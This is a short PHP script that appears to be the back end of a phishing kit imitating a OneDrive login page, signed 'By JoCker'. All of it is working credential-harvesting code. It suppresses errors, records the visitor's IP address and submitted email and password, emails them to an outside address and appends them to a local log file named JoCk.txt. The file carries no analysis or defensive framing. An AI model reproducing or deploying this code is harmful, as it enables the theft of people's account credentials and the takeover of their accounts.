<?php

error_reporting(0);
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);


$ip = getenv("REMOTE_ADDR");
$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "----------- |  Ondrive Log   | -----------\n";
$message .= "Email :  ".$_POST['X1']." \n";
$message .= "Pass  :  ".$_POST['X2']."\n";
$message .= "----------- | By JoCker | -----------\n";
$message .= "\n";
$send = "email@gmail.com";
$subject = "| Ondrive Log By JoCk | $ip |";
mail($send,$subject,$message);


$file = fopen("JoCk.txt", 'a');
fwrite($file, $message);





?>

